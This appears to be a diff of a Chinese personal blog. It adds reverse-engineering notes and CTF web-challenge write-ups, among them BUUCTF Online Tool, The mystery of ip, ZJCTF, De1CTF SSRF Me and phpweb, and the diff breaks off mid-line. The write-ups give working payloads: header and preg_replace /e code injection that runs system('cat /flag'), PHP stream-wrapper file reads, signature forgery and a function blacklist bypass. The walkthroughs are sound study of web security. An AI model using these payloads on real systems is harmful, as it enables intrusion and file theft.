+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RETN 8		&#x2F;&#x2F;RETN+POP 8字节</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这种调用方法<strong>兼容性</strong>更好</p>
+</li>
+</ol>
+<h2 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h2><p>正如名字所描述的fast，fastcall通常使用寄存器而非栈内存传递参数，因为访问寄存器通常会快很多。</p>
+<p>但当需要备份、程序复杂时，也不一定就快。</p>
 <h1 id="操作技巧"><a href="#操作技巧" class="headerlink" title="操作技巧"></a>操作技巧</h1><h2 id="Ollydbg"><a href="#Ollydbg" class="headerlink" title="Ollydbg"></a>Ollydbg</h2><h3 id="保存打完补丁的文件"><a href="#保存打完补丁的文件" class="headerlink" title="保存打完补丁的文件"></a>保存打完补丁的文件</h3><ol>
 <li><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/0-1.png" alt="0-1"></li>
 <li>在新跳出的页面<img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/0-2.png" alt="0-2"></li>
+<li>在栈里面跳转到内存地址<img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/0-3.png" alt="0-3"></li>
 </ol>
 <h3 id="一些操作快捷键"><a href="#一些操作快捷键" class="headerlink" title="一些操作快捷键"></a>一些操作快捷键</h3><p>F7（Step into）：单步执行，有CALL时进入函数</p>
 <p>F8（Step Over）：单步执行，有CALL时不进入CALL的地址</p>
@@ -1883,7 +2661,7 @@ Son mygs = <span class="keyword">new</span> grandSon();</code></pre>
 
 
 
-<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>进去直接看到一串源码</p>
+<h1 id="BUUCTF-2018-Online-Tool【escapeshellarg和escapeshellcmd】"><a href="#BUUCTF-2018-Online-Tool【escapeshellarg和escapeshellcmd】" class="headerlink" title="[BUUCTF 2018]Online Tool【escapeshellarg和escapeshellcmd】"></a>[BUUCTF 2018]Online Tool【escapeshellarg<code>和</code>escapeshellcmd】</h1><p>进去直接看到一串源码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们首先看到<code>escapeshellarg</code>和<code>escapeshellcmd</code>两个函数，不太了解，所以去大概查了一下，<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a>，里面讲到了两个函数结合出现时会有漏洞：</p>
@@ -1940,7 +2718,7 @@ Son mygs = <span class="keyword">new</span> grandSon();</code></pre>
 
 
 
-<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>先用扫描器扫描一下，发现了flag.php和/.git，但是直接读取flag.php失败。</p>
+<h1 id="GXYCTF2019-禁止套娃【正则】"><a href="#GXYCTF2019-禁止套娃【正则】" class="headerlink" title="[GXYCTF2019]禁止套娃【正则】"></a>[GXYCTF2019]禁止套娃【正则】</h1><p>先用扫描器扫描一下，发现了flag.php和/.git，但是直接读取flag.php失败。</p>
 <p>于是用GitHack扫一下拿到源码，但是我这里老是扫不出来，就很难受。</p>
 <p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/4-1.png" alt="4-1"></p>
 <p>所以直接拿了源码来分析下</p>
@@ -1994,7 +2772,7 @@ Son mygs = <span class="keyword">new</span> grandSon();</code></pre>
 <p>使用这个exp后，要利用bp抓包，然后加上cookie<img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/4-4.png" alt="4-4"></p>
 </li>
 </ol>
-<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>进去观察网址栏</p>
+<h1 id="安洵杯-2019-easy-web【MD5-bypass】"><a href="#安洵杯-2019-easy-web【MD5-bypass】" class="headerlink" title="[安洵杯 2019]easy_web【MD5/bypass】"></a>[安洵杯 2019]easy_web【MD5/bypass】</h1><p>进去观察网址栏</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5163acd7-7850-4f24-a2b4-cef0277781e7.node3.buuoj.cn&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure>
 
 <p>发现<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>很显眼，经过两次base64解密和一次十六进制解密后，得到<code>555.png</code>，猜想img=表示获取后面的内容，于是我们对index.php进行反向加密，输入后得到源码:</p>
@@ -2067,13 +2845,149 @@ Son mygs = <span class="keyword">new</span> grandSon();</code></pre>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $auth=<span class="string">'0'</span>;</span><br><span class="line">    import_request_variables(<span class="string">'G'</span>);</span><br><span class="line">    <span class="keyword">if</span>($auth== <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"private!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"public!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><code>?auth=1</code>时，输出private</p>
-<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>这题唯一的知识点就是：</p>
+<h1 id="BJDCTF2020-The-mystery-of-ip【XFF-client-ip】"><a href="#BJDCTF2020-The-mystery-of-ip【XFF-client-ip】" class="headerlink" title="[BJDCTF2020]The mystery of ip【XFF/client-ip】"></a>[BJDCTF2020]The mystery of ip【XFF/client-ip】</h1><p>这题唯一的知识点就是：</p>
 <p><code>X-FORWARDED-FOR</code>，<code>client-ip</code></p>
 <p>可以伪造ip，在flag.php抓个包，加个字段就OK了</p>
 <p>然后加大括号发现里面可以进行运算</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR：&#123;1+2&#125;			&#x2F;&#x2F;3</span><br><span class="line">X-FORWARDED-FOR：&#123;system(&#39;ls&#39;)&#125;   &#x2F;&#x2F;成功</span><br><span class="line">X-FORWARDED-FOR：&#123;system(&#39;cat &#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure>
 
+
+
+
+
+
+
+
+
+
+
+<h1 id="BJDCTF2020-ZJCTF，不过如此【正则表达式-eval】"><a href="#BJDCTF2020-ZJCTF，不过如此【正则表达式-eval】" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此【正则表达式/eval】"></a>[BJDCTF2020]ZJCTF，不过如此【正则表达式/eval】</h1><p>打开网页先发现源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以用两种方法绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一种：</span><br><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have dream</span><br><span class="line"></span><br><span class="line">第二种：</span><br><span class="line">?text&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">POST内容：</span><br><span class="line">I have a dream</span><br></pre></td></tr></table></figure>
+
+<p>绕过以后包含next.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>
+
+<p>解码之后得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(</span><br><span class="line">            <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">            <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">            $str</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>preg_replace(&#39;/xxx/e&#39;,para2,para3)</code>，e代表会执行para2，而<code>\1</code>代表匹配正则表达式括号里匹配到的第一个参数。</p>
+<blockquote>
+<p><strong>反向引用</strong></p>
+<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong>中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
+</blockquote>
+<p>这里我们可以</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?.*&#x3D;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是我本地测试了一下：发现<code>.</code>点开头是不合法的命名，于是php自动改成了<code>_</code>下划线</p>
+<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/6-1.png" alt="6-1"></p>
+<p>所以想到正则表达式可以这样构造</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?\S*&#x3D;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>页面上成功显示phpinfo()，于是可以构造：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?\S*&#x3D;$&#123;eval($_POST[ag])&#125;</span><br><span class="line">POST数据：</span><br><span class="line">ag&#x3D;system(&#39;cat &#x2F;flag&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>或者根据源码里的函数构造：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="De1CTF-2019-SSRF-Me【python代码审计】"><a href="#De1CTF-2019-SSRF-Me【python代码审计】" class="headerlink" title="[De1CTF 2019]SSRF Me【python代码审计】"></a>[De1CTF 2019]SSRF Me【python代码审计】</h1><p>先看源代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"><span class="comment">#_init_初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一个if：如果checkSign(self) 返回 True ，则进入下一个if</span></span><br><span class="line"><span class="comment">#审计checkSign(self)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line"><span class="comment">#如果scan在action里面，则我们可以让param进入scan这个函数，并的目录下创建一个result.txt</span></span><br><span class="line"><span class="comment">#然后通过scan()函数把名字为param的网址里的内容写到result.txt中，由于param是可控的，所以很容易想到这里把flag.txt传给param。</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="comment">#如果read在action里面，则我们可以读取读取result.txt的内容赋值给result</span></span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action,self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#如果getSign(self.action, self.param)和self.sign相等则返回True ,否则返回False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment">#提取get方法传入的，参数名叫param对应得值，并将其url编码后赋值给param</span></span><br><span class="line"><span class="comment">#将scan赋值给action</span></span><br><span class="line"><span class="comment">#审计 getSign()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="comment">#以get方法传入param参数值，在cookie里面传递action和sign的值</span></span><br><span class="line"><span class="comment">#使param绕过waf，审计waf</span></span><br><span class="line"><span class="comment">#用我们传进去的 action 、 param  、sign  、ip 这四个参数构造一个Task类对象，并且执行它的Exec方法</span></span><br><span class="line"><span class="comment">#审计Task</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="comment">#将secert_key 、param 、 action这三个值连接起来后进行md5加密，并将其作为十六进制数据字符串值返回</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#移除param头尾指定的字符(默认为空格或换行符)，并将param中中所有大写字符转化为小写</span></span><br><span class="line"><span class="comment">#若param以gopher或file为前缀，返回True,否者返回False</span></span><br><span class="line"><span class="comment">#回到challenge()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面给出审计过程：</p>
+<h2 id="De1ta"><a href="#De1ta" class="headerlink" title="/De1ta"></a>/De1ta</h2><h3 id="challenge-函数"><a href="#challenge-函数" class="headerlink" title="challenge()函数"></a>challenge()函数</h3><ol>
+<li>cookie获取action参数</li>
+<li>get获取param参数</li>
+<li>cookie获取sign参数</li>
+<li>正常获取ip</li>
+</ol>
+<p>先绕过waf(param)，然后创建Task(action,param,sign,ip)，然后执行Task对象里的Exec()方法。</p>
+<h3 id="waf-param"><a href="#waf-param" class="headerlink" title="waf(param)"></a>waf(param)</h3><p>param参数不能以gopher或者file开头。</p>
+<h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec()"></a>Exec()</h3><p>先通过checkSIgn()，如果“scan”在action里，则…；如果“read”在action里，则…</p>
+<h4 id="checkSign"><a href="#checkSign" class="headerlink" title="checkSign()"></a>checkSign()</h4><p>如果getSign(action,param)的值等于sign，则通过。【相当于 md5(secret_key+param+action) == sign】</p>
+<h5 id="getSign"><a href="#getSign" class="headerlink" title="getSign()"></a>getSign()</h5><p>返回md5(secret_key+param+action).hexdigest()</p>
+<blockquote>
+<p>.hexdigest()后的格式就是我们正常在网上用工具加密的结果</p>
+</blockquote>
+<h5 id="如果“scan”在action"><a href="#如果“scan”在action" class="headerlink" title="如果“scan”在action"></a>如果“scan”在action</h5><p>那么就读取param1的数据并且写入到result.txt</p>
+<h5 id="如果“read”在action里"><a href="#如果“read”在action里" class="headerlink" title="如果“read”在action里"></a>如果“read”在action里</h5><p>那么就读取result.txt的内容，然后赋给返回值result</p>
+<h3 id="De1ta分析结果"><a href="#De1ta分析结果" class="headerlink" title="/De1ta分析结果"></a>/De1ta分析结果</h3><ol>
+<li>cookie获取action参数、get获取param参数、cookie获取sign参数</li>
+<li>param参数不能以gopher或者file开头。</li>
+<li>md5(secret_key+param+action) == sign【我们不知道secret_key】</li>
+<li>action里要有”scan”和”read”</li>
+</ol>
+<h2 id="geneSign"><a href="#geneSign" class="headerlink" title="/geneSign"></a>/geneSign</h2><h3 id="geneSign-函数"><a href="#geneSign-函数" class="headerlink" title="geneSign()函数"></a>geneSign()函数</h3><ol>
+<li>get获取param参数</li>
+<li>action的值是”scan”</li>
+<li>返回getSign(action,param)【相当于md5(secret_key + param + “scan”)】</li>
+</ol>
+<h2 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h2><p>那么，结合两个路由的分析结果，我们知道：</p>
+<ol>
+<li>md5(secret_key + param + action)</li>
+<li>对于/geneSign的路由：geneSign()函数：返回md5(secret_key + param + “scan”)</li>
+<li>对于/De1ta的路由：1：md5(secret_key+param+action) == sign；2：action里要有”scan”和”read”；3.param是flag.txt来读取flag</li>
+</ol>
+<p>那么，我们在/geneSign路由里构造</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5(secret_key + &quot;flag.txtread&quot; + &quot;scan&quot;)</span><br><span class="line">得到的值到&#x2F;De1ta里相当于</span><br><span class="line">md5(secret_key + &quot;flag.txt&quot; + &quot;readscan&quot;)		&#x2F;&#x2F;即使sign的值和&#x2F;geneSign里返回的值一致</span><br></pre></td></tr></table></figure>
+
+
+
+<p>总结一下，就是：</p>
+<ol>
+<li>在/geneSign里构造：param=flag.txtread，得到返回值res</li>
+<li>在/De1ta里构造：param=flag.txt、action=readscan、sign=res</li>
+</ol>
+<h2 id="md5扩展攻击解法"><a href="#md5扩展攻击解法" class="headerlink" title="md5扩展攻击解法"></a>md5扩展攻击解法</h2><p>先了解一下<a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">hash扩展攻击原理</a></p>
+<p>使用场景：</p>
+<p>当我们知道md5(key + var1)的值和key的长度</p>
+<p>我们就可以求md5(key + var1 + 第一次填充 + var2)的值</p>
+<p>方法是把md5(key + var1)作为第二次运算的初始向量</p>
+<p>详情见<a href="https://blog.csdn.net/qq_35078631/article/details/70941204" target="_blank" rel="noopener">文章</a></p>
+<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>进去页面先看到这个</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form  id=form1 name=form1 action=<span class="string">"index.php"</span> method=post&gt;</span><br><span class="line">    &lt;input type=hidden id=func name=func value=<span class="string">'date'</span>&gt;</span><br><span class="line">    &lt;input type=hidden id=p name=p value=<span class="string">'Y-m-d h:i:s a'</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>试着POST上传这两个参数，发现出现以下报错</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Warning: date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 24</span><br><span class="line">2021-01-23 03:59:56 pm</span><br></pre></td></tr></table></figure>
+
+<p>考虑这两个参数会不会一个代表函数，一个代表函数的参数。</p>
+<p>尝试POST上传</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func&#x3D;system&amp;p&#x3D;ls</span><br></pre></td></tr></table></figure>
+
+<p>直接出了HACKER…证明猜测问题不大，但是应该过滤了一些危险函数。</p>
+<p>于是尝试能不能读出源代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func&#x3D;file_get_contents&amp;p&#x3D;index.php</span><br></pre></td></tr></table></figure>
+
+<p>还真读到了源代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span 